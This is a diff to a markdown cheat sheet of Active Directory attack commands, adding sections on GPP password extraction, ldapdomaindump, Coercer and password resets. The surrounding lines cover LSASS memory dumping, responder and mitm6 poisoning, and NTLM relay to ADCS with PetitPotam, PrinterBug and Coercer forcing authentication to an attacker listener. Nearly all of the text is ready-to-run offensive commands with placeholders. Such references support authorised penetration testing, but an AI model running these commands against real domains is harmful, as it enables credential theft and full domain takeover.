@@ -130,7 +130,7 @@
    * BloodHound
       * `cat users.json | jq | grep email | cut -d '"' -f 4 | sort -u > users.txt`
    * Impacket
-      * `GetADUsers.py <domain>/<user>:<pass> -dc-ip <ip>`
+      * `GetADUsers.py <domain>/<user>:<pass> [-dc-ip <ip>]`
 * Password Policy
    * Net Command
       * `net accounts /dom`
@@ -183,6 +183,11 @@
       * `MATCH (n) WHERE n.description IS NOT NULL RETURN n.name,n.description`
 
 
+## Ldapdomaindump
+* Kali
+   * `ldapdomaindump -u '<domain>\<user>' -p '<pass>' <dc-ip>`
+
+
 ## ASReproast
 
 * Don't forget to check ALL domains!
@@ -214,6 +219,13 @@
    * `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Tasks\lsass.DMP full`
 * CME
    * `crackmapexec smb <ip_subnet> -u <user> -p <pass> -M lsassy`
+
+
+## GPPPassword
+* CLI
+  * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
+* Impacket
+  * `Get-GPPPassword.py <domain>/<user>:<pass> -dc-ip <ip>`
 
 
 ## LSASS parsing
@@ -457,7 +469,7 @@
    * mitm6
       * `mitm6 -d <domain>`
    * responder
-      * `responder -I eth0 -rv`
+      * `responder -I eth0`
 
 
 ## Chisel
@@ -732,6 +744,12 @@ $assem = [System.Reflection.Assembly]::Load($data)
 * The unauthenticated variant is fixed as of Aug 10, 2021. The authenticated variant won't be fixed.
 
 
+## Coercer
+* https://github.com/p0dalirius/Coercer
+* `sudo python3 -m pip install coercer`
+* `Coercer -d <domain> -u <user> -p <pass> --listener <ATTACKER> --target <DC>`
+
+
 ## ADCS
 
 * https://github.com/GhostPack/Certify
@@ -766,9 +784,10 @@ $assem = [System.Reflection.Assembly]::Load($data)
    * If HTTP-based certificate enrollment interfaces are enabled, they are most likely vulnerable to NTLM relay attacks. The domain controller's NTLM credentials can then be relayed to the ADCS web enrollment and a DC certificate can be enrolled. This certificate can then be used to request a TGT and perform a DCSync.
 * Example:
    * `ntlmrelayx -t "http://<ca-server>/certsrv/certfnsh.asp" --adcs --template <template>`
-   * Then force authentication to your host, for example via Printerbug or Petitpotam.
+   * Then force authentication to your host, for example via Printerbug, Petitpotam, or Coercer.
       * PrinterBug: `SpoolSample.exe <DC> <ATTACKER>`
       * PetitPotam: `PetitPotam.py -d <domain> -u <user> -p <pass> <ATTACKER> <DC>`
+      * Coercer: `Coercer -d <domain> -u <user> -p <pass> --listener <ATTACKER> --target <DC>`
 * Notes
    * In some cases, domain computers are allowed to request certificates (instead of domain users). If the "ms-ds-MachineAccountQuota" is set to > 1, it is possible to create a computer account yourself with PowerMad or SharpMad. Then you can request a TGT for this machine account using Rubeus. And then request a certificate with an altname (so a Domain Admin) using Certify.
    * Option 1 - `PowerMad: New-MachineAccount -MachineAccount <computername> -Password $(ConvertTo-SecureString '<password>' -AsPlainText -Force)`
@@ -908,10 +927,10 @@ The KrbRelayUp tool uses this service ticket to authenticate to the local Servic
 
 * DPAT
    * `python3 dpat.py -n dump.ntds -c cracked.txt`
-* GPPPassword
-   * `findstr /S /I cpassword \\<domain>\sysvol\<domain>\policies\*.xml`
 * KeeThief
    * `Get-Process keepass | Get-KeePassDatabaseKey`
+* Reset password
+   * `smbpasswd -r <ip> -U '<domain>\<user>'`
 * Seatbelt
    * `Seatbelt.exe -group=all`
 * SharpAdidnsdump
